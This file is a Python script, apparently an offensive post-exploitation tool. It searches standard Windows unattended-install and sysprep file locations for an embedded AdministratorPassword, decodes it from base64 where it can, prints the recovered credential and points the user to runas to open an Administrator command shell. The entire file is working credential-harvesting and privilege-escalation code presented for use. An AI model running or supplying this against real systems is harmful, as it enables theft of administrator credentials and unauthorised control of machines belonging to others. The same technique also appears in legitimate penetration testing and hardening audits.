import os
import re
import base64

# Common file paths to check
file_paths = [
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\System32\Sysprep\sysprep.xml",
    r"C:\Windows\System32\Sysprep\sysprep.inf",
    r"C:\Unattend.xml",
    r"C:\autounattend.xml",
]

def extract_password(file_content):
    pattern = r"<AdministratorPassword>\s*<Value>(.*?)</Value>"
    match = re.search(pattern, file_content, re.IGNORECASE | re.DOTALL)
    if match:
        return match.group(1).strip()
    return None

def decode_password(pwd):
    try:
        decoded = base64.b64decode(pwd).decode('utf-8')
        return decoded
    except Exception:
        return None

def main():
    for path in file_paths:
        if os.path.exists(path):
            print(f"[+] Found file: {path}")
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                password = extract_password(content)
                if password:
                    print(f"[+] Extracted password: {password}")
                    decoded = decode_password(password)
                    if decoded and decoded != password:
                        print(f"[+] Base64 Decoded password: {decoded}")
                    else:
                        print("[+] Password is in plaintext or not base64.")
                    
                    print("\n[!] Use this password with the following command:")
                    print("    runas /user:Administrator cmd.exe")
                    return
    print("[-] No administrator password found in known file locations.")

if __name__ == "__main__":
    main()
